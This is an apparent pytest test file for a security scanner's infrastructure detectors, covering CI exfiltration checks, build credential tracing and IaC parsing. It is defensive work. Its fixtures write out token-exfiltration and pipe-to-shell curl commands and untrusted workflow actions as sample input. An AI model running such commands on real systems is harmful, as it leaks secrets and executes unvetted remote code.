"""Edges of the infrastructure detectors that a real repository reaches rarely: what each one
reports or withholds there."""

from __future__ import annotations

import ipaddress
import json
import re
from pathlib import Path
from typing import Any, cast

import pytest

from cordon_scanner import Scanner
from cordon_scanner.detect.base import ScanContext
from cordon_scanner.detect.infra import generated_policies
from cordon_scanner.detect.infra.ci_exfil import DropPoint
from cordon_scanner.detect.infra.config_files import ConfigDetector
from cordon_scanner.detect.infra.generated_policies import (
    GENERATED_DIGESTS,
    GENERATED_META,
    GENERATED_NAME,
    GeneratedPolicies,
)
from cordon_scanner.detect.infra.gradle_auth import GradleBuildAuth
from cordon_scanner.detect.infra.iac import IacBlocks, IacDetector
from cordon_scanner.detect.infra.iac_model import IacPolicy
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.models import Confidence, Severity
from cordon_scanner.rules.loader import RuleSet


class _Kit:
    @staticmethod
    def context(config: Config | None = None) -> ScanContext:
        return ScanContext(config=config or Config.default(), rules=RuleSet(()))

    @staticmethod
    def rule_ids(root: Path, relative: str, body: str, config: Config | None = None) -> set[str]:
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body, encoding="utf-8")
        scanner = Scanner(config) if config is not None else Scanner()
        return {f.rule_id for f in scanner.scan(root).findings}


_context = _Kit.context
_rule_ids = _Kit.rule_ids


class TestADropPointJudgedByWhatItReceives:
    SLACK = re.compile(rb"https://hooks\.slack\.com/\S+")

    def test_an_address_that_is_not_one_is_a_drop_point(self) -> None:
        destinations = re.compile(rb"(?:\d{1,3}\.){3}\d{1,3}")
        assert DropPoint.sends_to_one(destinations, b"curl http://999.1.1.1/x", b"") is True

    def test_a_job_own_address_is_not(self) -> None:
        destinations = re.compile(rb"(?:\d{1,3}\.){3}\d{1,3}")
        assert DropPoint.sends_to_one(destinations, b"curl http://10.1.2.3/x", b"") is False
        assert ipaddress.ip_address("10.1.2.3") in DropPoint.OWN_NETWORKS[0]

    def test_a_credential_variable_no_secret_maps_to_is_judged_by_its_own_name(self) -> None:
        window = b"curl -d $PRIVATE_TOKEN https://hooks.slack.com/services/T/B/x"
        assert DropPoint.sends_to_one(self.SLACK, window, window) is True

    def test_the_service_own_credential_variable_is_a_notification(self) -> None:
        window = b"curl -d $SLACK_TOKEN https://hooks.slack.com/services/T/B/x"
        assert DropPoint.sends_to_one(self.SLACK, window, window) is False


class TestABuildScriptCredentialChain:
    def test_a_line_outside_the_script_is_not_the_builds_own(self) -> None:
        assert GradleBuildAuth._own(['val k = System.getenv("K")'], 0) is False
        assert GradleBuildAuth._own(['val k = System.getenv("K")'], 2) is False

    def test_a_line_that_reads_nothing_is_not_a_credential_read(self) -> None:
        assert GradleBuildAuth._own(['storePassword = "fixed"'], 1) is False

    def test_a_name_handed_on_three_times_and_then_to_a_sink_is_the_builds_own(self) -> None:
        lines = [
            'val a = System.getenv("K")',
            "val b = a",
            "val c = b",
            "val d = c",
            "storePassword = d",
        ]
        assert GradleBuildAuth._own(lines, 1) is True

    def test_a_name_handed_on_four_times_is_no_longer_followed(self) -> None:
        lines = [
            'val a = System.getenv("K")',
            "val b = a",
            "val c = b",
            "val d = c",
            "val e = d",
            "storePassword = e",
        ]
        assert GradleBuildAuth._own(lines, 1) is False


class TestAPolicyAndTheKindsItApplies:
    @staticmethod
    def _policy(*resources: str) -> IacPolicy:
        return IacPolicy(
            id="T.1",
            title="t",
            message="m",
            remediation="r",
            severity=Severity.LOW,
            confidence=Confidence.LOW,
            resources=resources,
            forbid=("x",),
            bad="x",
            good="y",
        )

    def test_a_trailing_star_matches_a_prefix(self) -> None:
        policy = self._policy("aws_rds_*")
        assert policy.applies_to("aws_rds_cluster") is True
        assert policy.applies_to("aws_s3_bucket") is False

    def test_a_data_source_is_read_only_by_a_policy_naming_data(self) -> None:
        assert self._policy("aws_*").applies_to("data:aws_ami") is False
        assert self._policy("data:external").applies_to("data:external") is True
        assert self._policy("data:*").applies_to("data:external") is True


class TestTheGeneratedSetsManifest:
    @pytest.fixture(autouse=True)
    def _caches(self):
        GeneratedPolicies.generated_rows.cache_clear()
        GeneratedPolicies.generated_meta.cache_clear()
        generated_policies._REFUSED.clear()
        yield
        GeneratedPolicies.generated_rows.cache_clear()
        GeneratedPolicies.generated_meta.cache_clear()
        generated_policies._REFUSED.clear()

    @staticmethod
    def _data(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
        data = tmp_path / "data"
        data.mkdir()
        monkeypatch.setattr(generated_policies, "DATA_DIR", data)
        return data

    def test_an_unreadable_manifest_does_not_refuse_the_file(self, tmp_path: Path) -> None:
        (tmp_path / GENERATED_DIGESTS).write_text("{not json", encoding="utf-8")
        target = tmp_path / GENERATED_NAME
        target.write_bytes(b"x")
        assert GeneratedPolicies._digests_match(target) is True

    @pytest.mark.parametrize("manifest", ["[1, 2]", '{"other.gz": "00"}'])
    def test_a_manifest_that_does_not_list_the_file_does_not_refuse_it(
        self, tmp_path: Path, manifest: str
    ) -> None:
        (tmp_path / GENERATED_DIGESTS).write_text(manifest, encoding="utf-8")
        target = tmp_path / GENERATED_NAME
        target.write_bytes(b"x")
        assert GeneratedPolicies._digests_match(target) is True

    def test_a_listed_file_that_cannot_be_read_is_refused(self, tmp_path: Path) -> None:
        (tmp_path / GENERATED_DIGESTS).write_text(
            json.dumps({GENERATED_NAME: "0" * 64}), encoding="utf-8"
        )
        assert GeneratedPolicies._digests_match(tmp_path / GENERATED_NAME) is False

    @pytest.mark.parametrize("content", [b"not gzip at all", None])
    def test_a_file_that_is_not_a_gzip_yields_no_rows(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch, content: bytes | None
    ) -> None:
        data = self._data(tmp_path, monkeypatch)
        if content is not None:
            (data / GENERATED_NAME).write_bytes(content)
        assert GeneratedPolicies.generated_rows() == {}
        assert GeneratedPolicies.refused_files() == ()

    def test_rows_that_are_not_a_list_yield_nothing(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        import gzip

        data = self._data(tmp_path, monkeypatch)
        (data / GENERATED_NAME).write_bytes(gzip.compress(b'{"resources": []}'))
        assert GeneratedPolicies.generated_rows() == {}

    def test_a_missing_meta_is_an_empty_one(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        self._data(tmp_path, monkeypatch)
        assert GeneratedPolicies.generated_meta() == {}


class TestCoverageNotesOfTheInfrastructureDetector:
    @pytest.fixture(autouse=True)
    def _caches(self):
        GeneratedPolicies.generated_meta.cache_clear()
        yield
        GeneratedPolicies.generated_meta.cache_clear()

    @staticmethod
    def _notes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, meta: dict[str, Any]) -> list[Any]:
        data = tmp_path / "data"
        data.mkdir()
        (data / GENERATED_META).write_text(json.dumps(meta), encoding="utf-8")
        monkeypatch.setattr(generated_policies, "DATA_DIR", data)
        return IacDetector()._coverage_notes(".")

    def test_a_set_with_no_build_date_is_not_called_stale(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        assert self._notes(tmp_path, monkeypatch, {}) == []

    def test_a_build_date_that_is_not_a_date_is_not_called_stale(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        assert self._notes(tmp_path, monkeypatch, {"built_at": "last tuesday"}) == []

    def test_an_old_build_date_is_called_stale(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        notes = self._notes(tmp_path, monkeypatch, {"built_at": "2020-01-01T00:00:00Z"})
        assert [n.rule_id for n in notes] == ["OPERATIONAL.IAC.POLICIES_STALE"]

    def test_a_unit_that_is_not_a_file_is_not_inspected(self) -> None:
        assert IacDetector().inspect(cast(Any, object()), _context()) == ()


class TestInfrastructureBlocksOfOddShape:
    def test_a_brace_in_a_block_comment_does_not_close_the_resource(self) -> None:
        text = 'resource "aws_s3_bucket" "b" {\n  /* } not the end */\n  acl = "public-read"\n}\n'
        (block,) = IacBlocks.terraform_blocks(text)
        assert 'acl = "public-read"' in block.body

    def test_an_unterminated_block_comment_leaves_the_resource_unclosed(self) -> None:
        text = 'resource "aws_s3_bucket" "b" {\n  /* never closed\n  acl = "public-read"\n}\n'
        assert list(IacBlocks.terraform_blocks(text)) == []

    def test_cloudformation_json_resources_that_are_not_aws_are_skipped(self) -> None:
        text = json.dumps(
            {
                "Resources": {
                    "A": "text",
                    "B": {"Type": "Custom::Thing"},
                    "C": {"Type": 5},
                    "D": {"Type": "AWS::S3::Bucket"},
                }
            }
        )
        kinds = [b.kind for b in IacBlocks.cloudformation_json_blocks(text)]
        assert kinds == ["cfn:AWS::S3::Bucket"]

    def test_a_yaml_template_without_resources_has_no_blocks(self) -> None:
        assert list(IacBlocks.cloudformation_blocks("Parameters:\n  X:\n    Type: String\n")) == []

    def test_each_yaml_resource_ends_where_the_next_begins(self) -> None:
        text = (
            "Resources:\n"
            "  First:\n    Type: AWS::S3::Bucket\n    Properties:\n      A: 1\n"
            "  Second:\n    Type: AWS::SQS::Queue\n"
        )
        first, second = IacBlocks.cloudformation_blocks(text)
        assert (first.kind, second.kind) == ("cfn:AWS::S3::Bucket", "cfn:AWS::SQS::Queue")
        assert "SQS" not in first.body
        assert "S3" not in second.body

    def test_a_bicep_resource_whose_type_has_no_slash_is_not_azure(self) -> None:
        text = "resource thing 'Foo@2020-01-01' = {\n  name: 'x'\n}\n"
        assert list(IacBlocks.bicep_blocks(text)) == []

    def test_a_bicep_resource_that_never_closes_is_skipped(self) -> None:
        text = "resource sa 'Microsoft.Storage/storageAccounts@2023-01-01' = {\n  name: 'x'\n"
        assert list(IacBlocks.bicep_blocks(text)) == []

    def test_arm_entries_that_are_not_objects_are_skipped(self) -> None:
        text = json.dumps(
            {"resources": ["text", {"type": "Microsoft.Storage/storageAccounts", "name": "s"}]}
        )
        (block,) = IacBlocks.arm_blocks(text)
        assert block.kind == "azure:Microsoft.Storage/storageAccounts"

    def test_a_compose_file_without_services_has_none(self) -> None:
        assert list(IacBlocks.compose_services("version: '3'\nvolumes:\n  data: {}\n")) == []


class TestTheConfigurationDetectorEdges:
    def test_a_unit_that_is_not_a_file_is_not_inspected(self) -> None:
        assert ConfigDetector().inspect(cast(Any, object()), _context()) == ()

    def test_a_mitigation_window_of_a_last_line_without_a_newline_is_that_line(self) -> None:
        raw = b"RUN echo a\nRUN curl -sSL https://example.org/i.sh | sh"
        start = raw.index(b"curl")
        assert ConfigDetector._mitigation_window(raw, start, start + 4) == (
            b"RUN curl -sSL https://example.org/i.sh | sh"
        )

    def test_a_continued_line_is_one_window_in_both_directions(self) -> None:
        raw = b"RUN a \\\n  && curl x \\\n  && b\nRUN other\n"
        start = raw.index(b"curl")
        assert ConfigDetector._mitigation_window(raw, start, start + 4) == (
            b"RUN a \\\n  && curl x \\\n  && b\n"
        )

    INGRESS = (
        "apiVersion: v1\n{direction}:\n  - CidrIp: 0.0.0.0/0\n    FromPort: 22\n    ToPort: 22\n"
    )

    def test_a_cloudformation_egress_list_open_to_everywhere_is_not_ingress(
        self, tmp_path: Path
    ) -> None:
        body = self.INGRESS.format(direction="SecurityGroupEgress")
        assert "SUSPECT.IAC.PUBLIC_INGRESS.001" not in _rule_ids(tmp_path, "k8s/sg.yaml", body)

    def test_a_cloudformation_ingress_list_open_to_everywhere_is_reported(
        self, tmp_path: Path
    ) -> None:
        body = self.INGRESS.format(direction="SecurityGroupIngress")
        assert "SUSPECT.IAC.PUBLIC_INGRESS.001" in _rule_ids(tmp_path, "k8s/sg.yaml", body)

    WORKFLOW = (
        "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n"
        "      - uses: actions/checkout@v4\n"
        "      - uses: Evil/one@v1\n"
        "      - uses: Evil/two@v1\n"
        "      - uses: other/three@v1\n"
        "      - uses: ./local/action\n"
    )

    def test_an_action_from_an_owner_outside_the_approved_set_is_reported_once_per_owner(
        self, tmp_path: Path
    ) -> None:
        config = Config.default().with_overrides(
            allowed_action_owners=("actions/",), use_cache=False
        )
        path = tmp_path / ".github" / "workflows" / "ci.yml"
        path.parent.mkdir(parents=True)
        path.write_text(self.WORKFLOW, encoding="utf-8")
        found = [
            f
            for f in Scanner(config).scan(tmp_path).findings
            if f.rule_id == "POLICY.CI.ACTION_OWNER.001"
        ]
        assert sorted("Evil" in f.message for f in found) == [False, True]
        assert len(found) == 2

    def test_no_approved_set_means_no_owner_finding(self, tmp_path: Path) -> None:
        assert "POLICY.CI.ACTION_OWNER.001" not in _rule_ids(
            tmp_path, ".github/workflows/ci.yml", self.WORKFLOW
        )

    def test_generated_output_is_reported_as_such(self, tmp_path: Path) -> None:
        body = (
            'resource "aws_security_group_rule" "r" {\n  type = "ingress"\n'
            '  from_port = 22\n  cidr_blocks = ["0.0.0.0/0"]\n}\n'
        )
        sources = {}
        for relative in ("main.tf", "dist/main.tf"):
            path = tmp_path / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(body + f"# {relative}\n", encoding="utf-8")
        for f in Scanner().scan(tmp_path).findings:
            if f.rule_id == "SUSPECT.IAC.PUBLIC_INGRESS.001":
                sources[f.location.path] = f
        assert sources["dist/main.tf"].severity <= sources["main.tf"].severity
        assert "generated output" in sources["dist/main.tf"].message
        assert "generated output" not in sources["main.tf"].message
